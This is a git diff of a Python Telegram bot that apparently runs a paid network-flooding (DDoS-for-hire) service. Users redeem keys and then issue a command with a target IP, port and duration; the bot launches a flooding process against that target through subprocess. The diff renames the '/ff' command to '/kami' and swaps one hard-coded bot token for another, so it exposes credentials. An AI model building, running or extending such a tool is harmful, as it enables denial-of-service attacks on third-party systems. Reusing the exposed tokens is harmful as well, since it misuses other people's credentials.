@@ -9,7 +9,7 @@ import datetime
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
-BOT_TOKEN=("7357183656:AAGgw08K3nFIVRIxlJnPIFeABDK4A0igLDA")
+BOT_TOKEN=("7354852233:AAEqqlMxvuNx1OYW9qYbzOkfAOREvapWP0M")
 
 ADMIN_IDS=("6200706724")
 
@@ -141,7 +141,7 @@ async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(response)
 
 
-async def ff(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def kami(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global flooding_command
     user_id = str(update.message.from_user.id)
 
@@ -150,7 +150,7 @@ async def ff(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text('Usage: /ff <target_ip> <port> <duration>')
+        await update.message.reply_text('Usage: /kami <target_ip> <port> <duration>')
         return
 
     target_ip = context.args[0]
@@ -174,7 +174,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if flooding_command is None:
-        await update.message.reply_text('No flooding parameters set. Use /ff to set parameters.')
+        await update.message.reply_text('No flooding parameters set. Use /kami to set parameters.')
         return
 
     flooding_process = subprocess.Popen(flooding_command)
@@ -227,7 +227,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
         "User Commands:\n"
         "/redeem <key> - Redeem a key to gain access.\n"
-        "/ff <target_ip> <port> <duration> - Set the flooding parameters.\n"
+        "/kami <target_ip> <port> <duration> - Set the flooding parameters.\n"
         "/start - Start the flooding process.\n"
         "/stop - Stop the flooding process.\n"
     )
@@ -239,7 +239,7 @@ def main() -> None:
     application.add_handler(CommandHandler("gen", gen))
     application.add_handler(CommandHandler("redeem", redeem))
     application.add_handler(CommandHandler("allusers", allusers))
-    application.add_handler(CommandHandler("ff", ff))
+    application.add_handler(CommandHandler("kami", kami))
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("stop", stop))
     application.add_handler(CommandHandler("broadcast", broadcast))
